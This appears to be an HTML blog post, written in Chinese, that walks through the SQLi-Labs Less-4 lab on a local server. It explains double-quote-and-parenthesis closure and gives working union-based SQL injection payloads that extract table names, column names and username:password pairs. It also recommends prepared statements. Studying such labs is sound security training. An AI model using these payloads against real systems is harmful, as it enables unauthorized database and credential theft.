@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: SQLi-Labs Less-4 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> SQLi-Labs Less-4</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月25日</span>
+            <span><i class="fas fa-tag"></i> SQLi-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> 双引号加括号闭合</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>SQLi-Labs Less-4 (GET - Error based - Double Quotes - String)</li>
+            <li><strong>题目平台：</strong>SQLi-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / 字符型联合注入（双引号+括号）</li>
+            <li><strong>靶场链接：</strong>http://localhost:8081/Less-4/（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>双引号加括号闭合的字符型联合注入</strong>。后端 SQL 语句大概是 <code>WHERE id = ("$id") LIMIT 0,1;</code>。攻击者需要利用 <code>")</code> 组合来闭合双引号和括号，再用 <code>--+</code> 注释掉剩余的代码。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>访问页面，URL 为 <code>?id=1</code>，页面正常。</li>
+            <li>尝试 <code>?id=1"</code>，页面报错，说明是双引号闭合。</li>
+            <li>尝试 <code>?id=1") --+</code>，页面回显正常，说明闭合成功。</li>
+            <li>利用 <code>order by</code> 判断字段数（3列），用 <code>union select</code> 确定回显位（2和3）。</li>
+            <li>通过 <code>information_schema</code> 系统表查库名、表名、列名，最后查数据。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录：惯性思维使用单引号闭合</h4>
+            <p><strong>踩坑情况：</strong>由于连续做了前3关，惯性思维在 Less-4 里输入了 <code>?id=1' order by 3 --+</code>，结果页面报错。</p>
+            <p><strong>原因分析：</strong>Less-4 的后端代码包裹符号是双引号 <code>"</code>，不是单引号 <code>'</code>。</p>
+            <p><strong>改进方式：</strong>把 Payload 里的单引号全部替换成双引号，变成 <code>?id=1" order by 3 --+</code>，再结合括号，最终 Payload 为 <code>?id=1") order by 3 --+</code>。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（逐字解析）</h4>
+            
+            <p><strong>第一步：爆出数据库名和版本</strong></p>
+            <pre><code>?id=-1") union select 1,database(),version() --+</code></pre>
+            <p><strong>逐字解析：</strong><code>"</code> 闭合双引号，<code>)</code> 闭合括号。<code>union select</code> 联合查询。<code>database()</code> 回显 <code>security</code>，<code>version()</code> 回显 <code>5.5.44</code>。<code>--+</code> 注释掉剩余代码。</p>
+
+            <p><strong>第二步：爆出表名</strong></p>
+            <pre><code>?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre>
+            <p><strong>逐字解析：</strong>利用元数据表查表名，回显 <code>emails,referers,uagents,users</code>，锁定 <code>users</code>。</p>
+
+            <p><strong>第三步：爆出字段名</strong></p>
+            <pre><code>?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></pre>
+            <p><strong>逐字解析：</strong>查 <code>users</code> 表的所有列名，回显 <code>id,username,password</code>。</p>
+
+            <p><strong>第四步：爆出账号密码（图7）</strong></p>
+            <pre><code>?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+</code></pre>
+            <p><strong>逐字解析：</strong><code>0x3a</code> 是冒号的十六进制，用于分隔账号和密码。<code>from users</code> 直接从表里查数据。回显 <code>admin:admin</code> 等。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>API 接口测试：</strong>在 API 中，像 <code>/api/users/(id)</code> 这种带双引号和括号的路由参数，如果后端直接拼接 SQL，同样容易被 <code>")</code> 闭合注入。</li>
+            <li><strong>安全开发（SDL）：</strong>无论 SQL 语句是单引号、双引号还是括号包裹，字符串拼接始终是万恶之源，必须使用预编译语句（Prepared Statement）。</li>
+            <li><strong>密码学与绕过：</strong><code>0x3a</code> 这种十六进制表示法也是 WAF 绕过的常见技巧，利用编码差异绕过字符串匹配。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. 双引号+括号闭合</h4>
+            <p>代码格式如 <code>WHERE id = ("$id")</code>。单引号闭合无效，必须用 <code>")</code> 同时闭合双引号和括号。这属于字符型注入的另一个变种。</p>
+
+            <h4>2. 联合查询（UNION）</h4>
+            <p>用于合并两个 SELECT 的结果。前提是前后列数相同。常配合 <code>-1</code> 让原查询失效，以便回显注入的数据。</p>
+
+            <h4>3. information_schema 数据库</h4>
+            <p>MySQL 的元数据“户口本”，用来查库名、表名、列名，是 SQL 注入获取数据的必经之路。</p>
+
+            <h4>4. group_concat() 函数</h4>
+            <p>聚合函数，将多行结果合并成一行输出，避免页面只显示第一行。</p>
+            
+            <h4>5. 0x3a 十六进制</h4>
+            <p>ASCII 码中冒号的十六进制表示，用于在联合查询中分割用户名和密码，方便阅读。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Less-1 的区别：</strong>Less-1 是单引号，Less-4 是双引号+括号。</li>
+            <li><strong>与 Less-3 的区别：</strong>Less-3 是单引号+括号，Less-4 是双引号+括号。本质是在测试不同的闭合字符组合。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因</h3>
+        <p>开发人员写 SQL 时，可能会随机使用单引号或双引号，并随意加上括号。这种杂乱的代码风格是 SQL 注入漏洞的温床。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实渗透中，攻击者会针对不同的闭合方式构造特定的 Payload，最终通过 <code>union select</code> 拖库，或者写入 <code>outfile</code> 木马提权。</p>
+
+        <h3>4. 如何抽象理解概念（大白话理解）</h3>
+        <div class="highlight-box">
+            <p><strong>把数据库比作一个上了双层锁的箱子：</strong></p>
+            <ul>
+                <li><strong>Less-1（单引号锁）：</strong>只需单引号钥匙就能开。</li>
+                <li><strong>Less-3（单引号+括号锁）：</strong>需要先解开括号，再用单引号钥匙。</li>
+                <li><strong>Less-4（双引号+括号锁）：</strong>锁芯换成了双引号，你需要用 <code>")</code> 组合钥匙来开。本质上都是打破程序预设的语法结构，注入恶意指令。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
